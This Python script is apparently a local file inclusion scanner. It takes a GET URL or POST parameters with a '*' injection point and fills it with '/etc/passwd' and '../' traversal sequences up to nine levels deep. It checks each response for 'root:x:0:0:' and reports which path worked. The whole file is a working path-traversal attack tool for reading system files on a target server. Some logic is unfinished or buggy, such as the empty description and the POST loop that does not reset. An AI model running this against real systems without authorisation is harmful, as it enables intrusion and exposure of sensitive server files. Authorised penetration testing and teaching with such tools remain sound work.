#!/usr/bin/env python3

import requests
import requests.exceptions
import argparse
from colorama import Fore , Style
import sys

MAX_DEPTH = 10
	
#description of the tool
tool_description = ""	#to be filled
parser = argparse.ArgumentParser(description = tool_description)

parser.add_argument("METHOD" , help="specify whether to use GET/POST request")
parser.add_argument("URL" , help="specify the URL to be tested for LFI")
parser.add_argument("--params" , "-p" , help="speficy the parameteres when POST method is used" , required=False)
parser.add_argument("--proxy" , help="specify an HTTP proxy" , required=False)
parser.add_argument("--user-agent" , "-u" , help="specify a custom User-Agent in the request" , required=False)
arguments = parser.parse_args()


first_sled = "/"

other_sled = "../"

files = {
	"etc/passwd" : "root:x:0:0:" , 
}							#to be filled with more file names that are world readable generally
headers = {
	"Content-Type" : "application/x-www-form-urlencoded"	#necessary for getting output
}
if arguments.user_agent is not None:	#in case custom user agent is specified
	headers.update( {
		"User-Agent" : arguments.user_agent
	} )
proxy = {
	"http" : arguments.proxy
}


#GET-related stuff
def using_get_request():
	URL = arguments.URL
	print(f'[+]URL = "{URL}"')
	index_to_be_injected = URL.find("*")	#find() returns the index of the character if present
	if index_to_be_injected >= 0:
		print("[+]Found injection point in URL")
		if URL[index_to_be_injected - 1] == "=":
			print("[+]URL seems to be valid")
		else:
				print(Fore.RED + "[-]Invalid Parameter(missing '=')")	#if '=' is missing before '*'
				sys.exit()
	else:
		print(Fore.RED + "[-]Injection point not found!")			#if '*'(injection point) is absent
		sys.exit()
	
	
	#for first sled checks
	LFI_FOUND = False
	for current_file in files:
		URL = arguments.URL
		file_to_be_checked = first_sled + current_file
		URL = URL.replace("*" , file_to_be_checked)
		print(f"[+]Testing for URL: {URL}")
		
		LFI_FOUND = test_url_get(URL , files[current_file])
		
	if LFI_FOUND == False:
		print(Fore.RED + "[-]No LFI found at layer 0" + Style.RESET_ALL)

	#for other sled checks
	LFI_FOUND = False
	for depth in range(1 , MAX_DEPTH):			# starting from 1 because we have already done checks for 0 sled(0 depth)
		if LFI_FOUND is not True:
			for current_file in files:
				URL = arguments.URL
				file_to_be_checked = other_sled * depth + current_file
				URL = URL.replace("*" , file_to_be_checked)
				print(f"[+]Testing for URL: {URL}")
				LFI_FOUND = test_url_get(URL , files[current_file])
			
			if LFI_FOUND == False:
				print(Fore.RED + f"[-]No LFI found at layer {depth}" + Style.RESET_ALL)
					
def test_url_get(URL , key_string):
	try:
		response = requests.get(URL , headers = headers , proxies = proxy)
	except requests.exceptions.ConnectionError:
			print(Fore.RED + "[!]Error in establishing connection")
			sys.exit()
	except:
			print(Fore.RED + "[!]Oops! Something unusual happened in test_url_get()")
	if response.status_code >=200 and response.status_code < 400:
		if response.text.find(key_string) > -1:
			print(Fore.YELLOW + f"[+]LFI found for {URL}" + Style.RESET_ALL)
			return True
		else:
			return False
	else:
		print(Fore.RED + f"[-]Request wasn't successful! Status code = {response.status_code}" + Style.RESET_ALL)
		return False
	

#POST STUFF
#############
def using_post_request():
	URL = arguments.URL
	params = arguments.params
	print(f'[+]URL = "{URL}"')
	#finding injection point
	if params is not None:
		index_to_be_injected = params.find("*")		#find() returns the index of the character if present
		
		if index_to_be_injected >= 0:				#if injection point('*') is present
			print("[+]Found injection point in parameters")
			if params[index_to_be_injected - 1] == "=":	#if '=' is placed before '*'
				print("[+]parameter seems to be valid")
			else:
				print(Fore.RED + "[-]Invalid Parameter(missing '=')")	#if '=' is missing before '*'
				sys.exit()
		else:
			print(Fore.RED + "[-]Injection point not found!")			#if '*'(injection point) is absent
			sys.exit()
	else:
			print(Fore.RED + "[-]POST data missing")				#if POST data isn't specified
			sys.exit()


	#for first sled checks
	LFI_FOUND = False
	for current_file in files:
		URL = arguments.URL
		file_to_be_checked = first_sled + current_file
		params = params.replace("*" , file_to_be_checked)
		print(params)
		LFI_FOUND = test_url_post(params , files[current_file])
	if LFI_FOUND == False:
		print(Fore.RED + "[-]No LFI found at layer 0" + Style.RESET_ALL)


	#for other sled checks
	LFI_FOUND = False
	for depth in range(1 , MAX_DEPTH):			# starting from 1 because we have already done checks for 0 sled(0 depth)
		if LFI_FOUND is not True:
			for current_file in files:
				params = arguments.params
				file_to_be_checked = other_sled * depth + current_file
				params = params.replace("*" , file_to_be_checked)
				print(f"[+]Testing for URL: {params}")
				LFI_FOUND = test_url_post(params , files[current_file])
			
			if LFI_FOUND == False:
				print(Fore.RED + f"[-]No LFI found at layer {depth}" + Style.RESET_ALL)



def test_url_post(params , key_string):
	try:
		response = requests.post(url=arguments.URL , data=params , headers = headers , proxies = proxy)
	except requests.exceptions.ConnectionError:
		print(Fore.RED + "[!]Error in establishing connection")
		sys.exit()
	if response.status_code >=200 and response.status_code < 400:
		if response.text.find(key_string) > -1:
			print(Fore.YELLOW + f"[+]LFI found for {params}" + Style.RESET_ALL)
			return True
		else:
			return False
	else:
		print(Fore.RED + f"[-]Request wasn't successful! Status code = {response.status_code}" + Style.RESET_ALL)
	


###### MAIN ########
if __name__ == "__main__":
	if arguments.METHOD.lower() == "get":				#lower() for case insensitive comparision
		using_get_request()

	elif arguments.METHOD.lower() == "post":
		using_post_request()

	else:
		print("Invalid Method!")
